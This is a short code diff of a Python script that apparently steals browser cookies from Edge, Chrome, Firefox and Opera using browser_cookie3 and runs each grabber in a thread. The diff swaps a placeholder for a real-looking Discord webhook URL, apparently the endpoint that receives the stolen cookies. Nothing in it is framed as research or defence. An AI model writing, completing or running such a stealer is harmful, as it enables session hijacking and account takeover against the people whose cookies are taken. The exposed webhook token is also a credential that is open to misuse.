@@ -1,6 +1,6 @@
 import browser_cookie3, requests, threading
 
-webhook = "your webhook here"
+webhook = "https://discord.com/api/webhooks/1414021612348506152/VS9TUiGwzxZ2T9l6qg7LMF7L-clAnch4LfU2rw2qdZqf7aCdLBN7NqR3lrpQxjXVaYgt"
 
 def edge_logger():
     try:
@@ -41,4 +41,5 @@ def opera_logger():
 browsers = [edge_logger, chrome_logger, firefox_logger, opera_logger]
 
 for x in browsers:
+
     threading.Thread(target=x,).start()
